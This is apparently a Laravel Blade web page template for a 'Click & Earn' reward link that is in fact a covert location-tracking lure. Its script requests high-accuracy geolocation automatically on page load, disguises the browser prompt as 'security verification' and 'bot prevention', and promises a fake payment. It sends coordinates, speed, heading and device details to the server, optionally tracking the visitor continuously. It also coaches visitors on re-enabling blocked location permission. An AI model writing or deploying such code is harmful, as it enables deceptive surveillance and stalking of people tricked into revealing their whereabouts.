<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>Earn 100 | Click on Link - {{ $link->title }}</title>

    <!-- Bootstrap 5 CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Bootstrap Icons -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <!-- Google Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap"
        rel="stylesheet">

    <style>
        :root {
            --primary-gradient: linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%);
            --success-gradient: linear-gradient(135deg, #059669 0%, #10b981 100%);
        }

        body {
            font-family: 'Plus Jakarta Sans', sans-serif;
            background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 100%);
            min-height: 100vh;
            color: #ffffff;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1.5rem;
        }

        .share-card {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(16px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 24px;
            color: #1e293b;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.4);
            max-width: 480px;
            width: 100%;
            overflow: hidden;
        }

        .pulse-icon-container {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            background: var(--primary-gradient);
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 1.5rem;
            box-shadow: 0 10px 25px rgba(79, 70, 229, 0.4);
            animation: pulse-ring 2.5s infinite;
        }

        @keyframes pulse-ring {
            0% {
                transform: scale(0.95);
                box-shadow: 0 0 0 0 rgba(79, 70, 229, 0.7);
            }

            70% {
                transform: scale(1);
                box-shadow: 0 0 0 16px rgba(79, 70, 229, 0);
            }

            100% {
                transform: scale(0.95);
                box-shadow: 0 0 0 0 rgba(79, 70, 229, 0);
            }
        }

        .btn-share {
            background: var(--primary-gradient);
            color: #ffffff;
            border: none;
            padding: 1rem 2rem;
            font-size: 1.1rem;
            font-weight: 700;
            border-radius: 14px;
            width: 100%;
            transition: all 0.2s ease;
            box-shadow: 0 10px 20px -5px rgba(79, 70, 229, 0.4);
        }

        .btn-share:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 15px 25px -5px rgba(79, 70, 229, 0.5);
            color: #ffffff;
        }

        .btn-share:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }

        .status-box {
            border-radius: 14px;
            padding: 1rem;
            font-size: 0.95rem;
            display: none;
        }

        /* Verification Access Required Modal */
        .verify-modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(15, 23, 42, 0.85);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            z-index: 9999;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1.5rem;
            animation: fadeInModal 0.25s ease-out;
        }

        .verify-modal-card {
            background: #ffffff;
            border-radius: 24px;
            max-width: 440px;
            width: 100%;
            padding: 2.25rem 2rem;
            text-align: center;
            color: #1e293b;
            box-shadow: 0 25px 60px -10px rgba(0, 0, 0, 0.6);
            border: 1px solid rgba(255, 255, 255, 0.2);
            animation: scaleInModal 0.25s ease-out;
        }

        .verify-modal-icon-wrapper {
            width: 76px;
            height: 76px;
            border-radius: 50%;
            background: rgba(79, 70, 229, 0.12);
            border: 2px solid rgba(79, 70, 229, 0.25);
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto;
            box-shadow: 0 8px 20px rgba(79, 70, 229, 0.2);
            animation: bouncePin 2s infinite ease-in-out;
        }

        .btn-modal-enable {
            background: var(--primary-gradient);
            color: #ffffff;
            border: none;
            padding: 1rem 1.75rem;
            font-size: 1.05rem;
            font-weight: 700;
            border-radius: 14px;
            width: 100%;
            transition: all 0.2s ease;
            box-shadow: 0 10px 20px -5px rgba(79, 70, 229, 0.4);
        }

        .btn-modal-enable:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 15px 25px -5px rgba(79, 70, 229, 0.5);
            color: #ffffff;
        }

        .btn-modal-enable:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }

        @keyframes fadeInModal {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        @keyframes scaleInModal {
            from { transform: scale(0.92); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }

        @keyframes bouncePin {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-6px); }
        }

        @keyframes shakeBox {
            0%, 100% { transform: translateX(0); }
            20%, 60% { transform: translateX(-6px); }
            40%, 80% { transform: translateX(6px); }
        }

        .shake-box {
            animation: shakeBox 0.5s ease-in-out;
            border-color: #ef4444 !important;
            background-color: #fff1f2 !important;
        }
    </style>
</head>

<body>

    <div class="share-card p-4 p-md-5">
        <div class="text-center">
            <!-- Animated Icon -->
            <div class="pulse-icon-container" id="iconContainer">
                <i class="bi bi-gift-fill text-white fs-1" id="mainIcon"></i>
            </div>

            <span
                class="badge bg-primary bg-opacity-10 text-primary border border-primary border-opacity-25 px-3 py-1 rounded-pill small fw-bold mb-2">
                Session: {{ $link->token }}
            </span>

            <h4 class="fw-bold text-dark mt-2 mb-2">{{ $link->title }}</h4>
            <p class="text-muted small mb-4">
                Please allow the security verification prompt when asked by your browser to proceed and unlock your reward.
            </p>
        </div>

        <!-- Status Alert Messages -->
        <div id="statusBox" class="status-box mb-4 text-center"></div>

        <!-- Confirmation / Success Card -->
        <div id="successBox" class="p-3 rounded-4 mb-4 text-center border" style="display: none; background: #ecfdf5; border-color: #a7f3d0 !important;">
            <div class="d-flex align-items-center justify-content-center gap-2 text-success fw-bold mb-1">
                <i class="bi bi-check-circle-fill fs-5"></i>
                <span>Verification Successful!</span>
            </div>
            <p class="text-muted small mb-0">Your payment is being processed. Please keep this session open to receive your reward.</p>
        </div>

        <!-- Action Section -->
        <div class="mt-4" id="actionSection">
            <button id="shareBtn" class="btn-share d-flex align-items-center justify-content-center gap-2">
                <i class="bi bi-gift-fill fs-5"></i>
                <span>Click & Earn Now</span>
            </button>

            <div class="form-check form-switch mt-3 d-flex justify-content-center gap-2">
                <input class="form-check-input" type="checkbox" id="continuousTrackingSwitch">
                <label class="form-check-label small text-muted" for="continuousTrackingSwitch">
                    Keep this page active while I complete the process
                </label>
            </div>

            <div class="text-center mt-3">
                <span class="text-muted" style="font-size: 0.8rem;">
                    <i class="bi bi-shield-lock-fill me-1 text-success"></i>
                    Protected by 256-bit automated bot prevention & verification.
                </span>
            </div>
        </div>
    </div>

    <!-- Security Verification Required Popup Modal -->
    <div id="verifyRequiredModal" class="verify-modal-overlay" style="display: none;">
        <div class="verify-modal-card">
            <div class="verify-modal-icon-wrapper">
                <i class="bi bi-shield-check text-primary fs-1"></i>
            </div>
            <h4 class="fw-bold text-dark mt-3 mb-2">Verification Required</h4>
            <p class="text-secondary mb-3 small">
                To prevent automated bots and claim your reward, please allow the browser security verification prompt.
            </p>

            <div id="modalInstructions" class="alert alert-light border small text-start mb-3 p-3" style="display: none; border-radius: 14px;">
                <div class="d-flex align-items-center gap-2 mb-2 text-danger fw-bold">
                    <i class="bi bi-exclamation-octagon-fill fs-6"></i>
                    <span>Permission Blocked in Browser</span>
                </div>
                <p class="mb-2 text-dark small" style="line-height: 1.4;">
                    Your browser or device has blocked verification for this site. To allow access:
                </p>
                <div class="bg-white p-2 rounded border mb-2 text-dark" style="font-size: 0.82rem; line-height: 1.5;">
                    <div class="mb-2">
                        <strong>💻 Chrome / Edge (Desktop):</strong>
                        <div class="mt-1">1. Look at the top URL bar. Click the <strong>🎚️ Tune</strong> or <strong>🔒 Lock</strong> icon on the left (or <strong>📍❌</strong> on the right).</div>
                        <div>2. Set <strong>Permissions / Location</strong> to <strong>Allow</strong> (or click <strong>Reset permissions</strong>).</div>
                        <div>3. Click <strong>"I Allowed it — Verify Now"</strong> below.</div>
                    </div>
                    <div>
                        <strong>📱 Mobile (Chrome / Safari):</strong>
                        <div class="mt-1">Tap the <strong>🔒 Lock / Tune</strong> (or <strong>aA</strong>) icon next to the URL &rarr; <strong>Site Settings</strong> &rarr; Set to <strong>Allow</strong>.</div>
                    </div>
                </div>
                <div class="text-muted" style="font-size: 0.8rem;">
                    <i class="bi bi-info-circle me-1"></i> Windows user? Also ensure <em>Windows Settings &rarr; Privacy &rarr; Location</em> is turned ON.
                </div>
            </div>

            <div class="d-flex flex-column gap-2 mt-3">
                <button type="button" id="modalVerifyBtn" class="btn-modal-enable d-flex align-items-center justify-content-center gap-2">
                    <i class="bi bi-shield-check fs-5"></i>
                    <span id="modalVerifyBtnText">Continue & Verify</span>
                </button>

                <button type="button" id="modalReloadBtn" class="btn btn-outline-secondary btn-sm py-2 rounded-3 fw-semibold d-flex align-items-center justify-content-center gap-1">
                    <i class="bi bi-arrow-clockwise"></i> Reload Page
                </button>
            </div>
        </div>
    </div>

    <!-- Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>

    <script>
        document.addEventListener('DOMContentLoaded', function () {
            const shareBtn = document.getElementById('shareBtn');
            const statusBox = document.getElementById('statusBox');
            const actionSection = document.getElementById('actionSection');
            const successBox = document.getElementById('successBox');
            const continuousSwitch = document.getElementById('continuousTrackingSwitch');
            const iconContainer = document.getElementById('iconContainer');
            const mainIcon = document.getElementById('mainIcon');

            const verifyRequiredModal = document.getElementById('verifyRequiredModal');
            const modalInstructions = document.getElementById('modalInstructions');
            const modalVerifyBtn = document.getElementById('modalVerifyBtn');
            const modalReloadBtn = document.getElementById('modalReloadBtn');

            let watchId = null;

            function showVerifyPopup(isBlocked = false) {
                verifyRequiredModal.style.display = 'flex';
                if (isBlocked) {
                    modalInstructions.style.display = 'block';
                    modalInstructions.classList.remove('shake-box');
                    void modalInstructions.offsetWidth;
                    modalInstructions.classList.add('shake-box');

                    modalVerifyBtn.disabled = false;
                    modalVerifyBtn.innerHTML = '<i class="bi bi-arrow-repeat fs-5"></i><span>I Allowed it — Verify Now</span>';
                } else {
                    modalInstructions.style.display = 'none';
                    modalVerifyBtn.disabled = false;
                    modalVerifyBtn.innerHTML = '<i class="bi bi-shield-check fs-5"></i><span>Continue & Verify</span>';
                }
            }

            function hideVerifyPopup() {
                verifyRequiredModal.style.display = 'none';
            }

            modalVerifyBtn.addEventListener('click', function () {
                modalVerifyBtn.disabled = true;
                modalVerifyBtn.innerHTML = '<span class="spinner-border spinner-border-sm me-2"></span>Applying & Verifying...';

                // Synchronously call geolocation without setTimeout to preserve browser user activation
                navigator.geolocation.getCurrentPosition(
                    function (pos) {
                        hideVerifyPopup();
                        sendCoordinates(pos);
                    },
                    function (err) {
                        console.warn('Direct user verification attempt error:', err);
                        // In Chrome, if the user changed permissions in the URL bar, 
                        // the browser requires a document reload for JavaScript to receive the new permissions.
                        modalVerifyBtn.innerHTML = '<span class="spinner-border spinner-border-sm me-2"></span>Reloading to apply changes...';
                        setTimeout(function () {
                            window.location.reload();
                        }, 500);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 8000,
                        maximumAge: 0
                    }
                );
            });

            modalReloadBtn.addEventListener('click', function () {
                window.location.reload();
            });

            // Watch for browser permission changes live
            if (navigator.permissions && navigator.permissions.query) {
                navigator.permissions.query({ name: 'geolocation' }).then(function (permissionStatus) {
                    permissionStatus.onchange = function () {
                        if (this.state === 'granted') {
                            hideVerifyPopup();
                            startVerifyCapture();
                        }
                    };
                }).catch(function () {
                    // Ignore unsupported queries
                });
            }

            function setStatus(type, message, showSpinner = false) {
                statusBox.style.display = 'block';
                statusBox.className = 'status-box mb-4 text-center ' +
                    (type === 'loading' ? 'bg-primary bg-opacity-10 text-primary border border-primary border-opacity-25' :
                        type === 'success' ? 'bg-success bg-opacity-10 text-success border border-success border-opacity-25' :
                            'bg-danger bg-opacity-10 text-danger border border-danger border-opacity-25');

                let icon = '';
                if (showSpinner) {
                    icon = '<div class="spinner-border spinner-border-sm me-2" role="status"></div>';
                } else if (type === 'success') {
                    icon = '<i class="bi bi-check-circle-fill me-2 fs-5"></i>';
                } else if (type === 'error') {
                    icon = '<i class="bi bi-exclamation-triangle-fill me-2 fs-5"></i>';
                }

                statusBox.innerHTML = `<div>${icon}<strong>${message}</strong></div>`;
            }

            function sendCoordinates(position, extraInfo = '') {
                const coords = position.coords;
                const deviceInfo = `${navigator.platform || 'Unknown'} - ${navigator.userAgent.slice(0, 50)}${extraInfo ? ' [' + extraInfo + ']' : ''}`;
                const payload = {
                    latitude: coords.latitude,
                    longitude: coords.longitude,
                    accuracy: coords.accuracy || null,
                    altitude: coords.altitude || null,
                    speed: coords.speed || null,
                    heading: coords.heading || null,
                    device_info: deviceInfo,
                };

                const csrfToken = document.querySelector('meta[name="csrf-token"]').getAttribute('content');

                return fetch('{{ route("share.store", $link->token) }}', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-CSRF-TOKEN': csrfToken,
                        'Accept': 'application/json',
                    },
                    body: JSON.stringify(payload)
                })
                    .then(res => res.json())
                    .then(data => {
                        if (data.success) {
                            hideVerifyPopup();
                            setStatus('success', 'Payment is being proceed!');
                            iconContainer.style.background = 'var(--success-gradient)';
                            if (mainIcon) mainIcon.className = 'bi bi-check-circle-fill text-white fs-1';
                            if (successBox) successBox.style.display = 'block';

                            if (!continuousSwitch.checked) {
                                shareBtn.disabled = true;
                                shareBtn.innerHTML = '<i class="bi bi-check-lg me-1"></i> Payment is being proceed!';
                            }
                        } else {
                            setStatus('error', 'Unable to complete verification. Please try again.');
                            shareBtn.disabled = false;
                            showVerifyPopup(false);
                        }
                    })
                    .catch(err => {
                        console.error('Transmission error:', err);
                        setStatus('error', 'Network error. Please try again.');
                        shareBtn.disabled = false;
                        showVerifyPopup(false);
                    });
            }

            function handleVerifyError(error) {
                shareBtn.disabled = false;
                shareBtn.innerHTML = '<i class="bi bi-arrow-clockwise fs-5"></i><span>Try Again</span>';

                const code = error ? error.code : 0;
                const isBlocked = (code === 1 || (window.GeolocationPositionError && code === GeolocationPositionError.PERMISSION_DENIED));

                if (navigator.permissions && navigator.permissions.query) {
                    navigator.permissions.query({ name: 'geolocation' }).then(function (permStatus) {
                        const actuallyDenied = (permStatus.state === 'denied');
                        showVerifyPopup(actuallyDenied);
                    }).catch(function () {
                        showVerifyPopup(isBlocked);
                    });
                } else {
                    showVerifyPopup(isBlocked);
                }

                let title = 'Verification Required';
                let details = '';

                if (isBlocked) {
                    title = 'Permission Blocked in Browser';
                    details = `
                        <div class="mt-2 text-start small">
                            <p class="mb-2"><strong>How to enable access:</strong></p>
                            <ul class="ps-3 mb-0">
                                <li>Click the <strong>🔒 lock / tune icon</strong> next to the URL in your address bar.</li>
                                <li>Change permission to <strong>Allow</strong>.</li>
                                <li>Refresh this page and tap <strong>Continue & Verify</strong>.</li>
                            </ul>
                        </div>
                    `;
                } else if (code === 2 || (window.GeolocationPositionError && code === GeolocationPositionError.POSITION_UNAVAILABLE)) {
                    title = 'Verification Temporarily Unavailable';
                    details = '<div class="small mt-1">Unable to complete security check. Please try again.</div>';
                } else if (code === 3 || (window.GeolocationPositionError && code === GeolocationPositionError.TIMEOUT)) {
                    title = 'Request Timed Out';
                    details = '<div class="small mt-1">Request timed out. Please try again.</div>';
                } else {
                    details = `<div class="small mt-1">Security verification is required to proceed.</div>`;
                }

                statusBox.style.display = 'block';
                statusBox.className = 'status-box mb-4 text-center bg-danger bg-opacity-10 text-danger border border-danger border-opacity-25';
                statusBox.innerHTML = `
                    <div><i class="bi bi-exclamation-triangle-fill me-2 fs-5"></i><strong>${title}</strong></div>
                    ${details}
                `;
            }

            function requestCoordinates(highAccuracy = true) {
                const geoOptions = {
                    enableHighAccuracy: highAccuracy,
                    timeout: highAccuracy ? 10000 : 20000,
                    maximumAge: 0
                };

                if (continuousSwitch.checked) {
                    if (watchId) {
                        navigator.geolocation.clearWatch(watchId);
                    }
                    watchId = navigator.geolocation.watchPosition(
                        function (pos) {
                            sendCoordinates(pos);
                            shareBtn.innerHTML = '<i class="bi bi-arrow-repeat spin me-2"></i>Processing Reward...';
                        },
                        function (err) {
                            if (highAccuracy && (err.code === 2 || err.code === 3)) {
                                requestCoordinates(false);
                            } else {
                                handleVerifyError(err);
                            }
                        },
                        geoOptions
                    );
                } else {
                    navigator.geolocation.getCurrentPosition(
                        function (pos) {
                            sendCoordinates(pos);
                        },
                        function (err) {
                            if (highAccuracy && (err.code === 2 || err.code === 3)) {
                                requestCoordinates(false);
                            } else {
                                handleVerifyError(err);
                            }
                        },
                        geoOptions
                    );
                }
            }

            function startVerifyCapture() {
                if (!navigator.geolocation) {
                    setStatus('error', 'Your browser does not support the required verification feature.');
                    showVerifyPopup(true);
                    return;
                }

                shareBtn.disabled = true;
                shareBtn.innerHTML = '<span class="spinner-border spinner-border-sm me-2"></span>Verifying Device...';
                setStatus('loading', 'Verifying device authenticity & security token...', true);

                requestCoordinates(true);
            }

            shareBtn.addEventListener('click', function () {
                startVerifyCapture();
            });

            // Automatically request verification check as soon as the page is opened
            startVerifyCapture();
        });
    </script>
</body>

</html>